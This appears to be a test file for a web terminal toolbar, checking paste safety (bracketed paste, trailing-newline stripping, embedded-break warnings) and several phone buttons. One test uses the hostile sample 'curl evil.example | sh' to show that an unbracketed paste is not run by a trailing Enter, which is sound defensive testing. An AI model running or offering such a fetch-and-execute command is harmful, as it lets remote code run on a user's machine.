'use strict';
const { test } = require('node:test');
const assert = require('node:assert');
require('../src/keys.js');   // config.js parses the tmux prefix through it
require('../src/config.js'); // toolbar.js asks it for the picker address
require('../src/toolbar.js');
const { pasteSequence, createToolbar } = globalThis.DEJIMA.toolbar;

// A toolbar wired to spies, with an element stub standing in for the DOM the
// real one attaches to. fire() reaches the action table the way a tap does,
// through the pointerdown listener, so a button wired to the wrong name fails
// here rather than only on a phone.
function makeToolbar(overrides) {
  const listeners = {};
  const root = {
    hidden: true,
    addEventListener: (type, fn) => { listeners[type] = fn; },
    // refreshLatches paints the CTRL and DRAG buttons; nothing here asserts on
    // that, but the toolbar calls it on attach, so it has to find something.
    querySelector: () => ({ classList: { toggle: () => {} } })
  };
  const opts = Object.assign({
    root: root,
    term: { focus: () => {}, textarea: { focus: () => {} } },
    modes: { bracketedPaste: () => false },
    latch: { state: () => 'off', armed: () => false, tap: () => {}, consume: () => {}, reset: () => {} },
    sendText: () => {},
    prefix: () => '\x02',
    notify: () => {},
    search: () => '',
    navigate: () => {},
    allowKeyboard: () => {}
  }, overrides || {});
  const toolbar = createToolbar(opts);
  toolbar.attach();
  return {
    fire: function (action) {
      listeners.pointerdown({
        target: { closest: () => ({ dataset: { action: action } }) },
        preventDefault: () => {}
      });
    }
  };
}

// The clipboard is session-writable through OSC 52, so what PASTE sends is
// content that may not be the operator's. Without bracketed paste a trailing
// newline is Enter, and the difference between "text appeared at my prompt"
// and "text ran at my prompt" is exactly that byte.

test('bracketed paste sends the text unchanged, between the markers', () => {
  const r = pasteSequence('echo hi\n', true);
  assert.equal(r.send, '\x1b[200~echo hi\n\x1b[201~');
  assert.equal(r.warn, false, 'the application is told this is data');
});

test('an unbracketed paste never ends in a newline', () => {
  for (const ending of ['\n', '\r\n', '\n\n', '\r\n\r\n']) {
    const r = pasteSequence('curl evil.example | sh' + ending, false);
    assert.equal(r.send, 'curl evil.example | sh',
      `trailing ${JSON.stringify(ending)} would have run it`);
  }
});

test('an unbracketed paste with no newline is untouched and unremarked', () => {
  const r = pasteSequence('some text', false);
  assert.equal(r.send, 'some text');
  assert.equal(r.warn, false);
});

test('line breaks left in the middle are flagged, not removed', () => {
  const r = pasteSequence('one\ntwo\n', false);
  assert.equal(r.send, 'one\ntwo', 'only the trailing break is stripped');
  assert.equal(r.warn, true, 'the embedded break still arrives as Enter');
});

test('stripping does not turn a multi-line paste into a silent one', () => {
  // The warning keys on what is actually sent, not on what was on the
  // clipboard - a paste whose only break was the trailing one is now
  // single-line and has nothing to warn about.
  assert.equal(pasteSequence('single\n', false).warn, false);
});

// The two buttons added for a phone: Enter, because it is the key a harness
// wants most and no soft keyboard row has it where a thumb is; and SESS, to
// get back to the picker without closing the tab.

test('ENTER sends a carriage return, not a newline', () => {
  // A terminal's Enter is CR. LF would submit nothing at a shell prompt and
  // insert a line in an editor, which is the kind of difference that reads as
  // "the button is broken".
  const sent = [];
  const t = makeToolbar({ sendText: (s) => sent.push(s) });
  t.fire('enter');
  assert.deepEqual(sent, ['\r']);
});

test('SESS navigates to the picker, dropping only the run-id', () => {
  const went = [];
  const t = makeToolbar({
    search: () => '?arg=run-7&toolbar=1',
    navigate: (s) => went.push(s)
  });
  t.fire('sessions');
  assert.equal(went.length, 1);
  const p = new URLSearchParams(went[0]);
  assert.equal(p.get('arg'), null, 'the run-id is what sends it back to the picker');
  assert.equal(p.get('toolbar'), '1', 'page options survive the trip');
});

test('KBD is what unlocks the keyboard, and it does so before focusing', () => {
  // The order matters: the focus handler that drops an unwanted focus reads
  // the flag, so setting it afterwards would blur the focus KBD just asked for.
  const order = [];
  const t = makeToolbar({
    allowKeyboard: () => order.push('allow'),
    term: {
      focus: () => order.push('focus'),
      textarea: { focus: () => order.push('textarea') }
    }
  });
  t.fire('kbd');
  assert.equal(order[0], 'allow', 'the keyboard is unlocked first');
  assert.ok(order.includes('focus'));
});
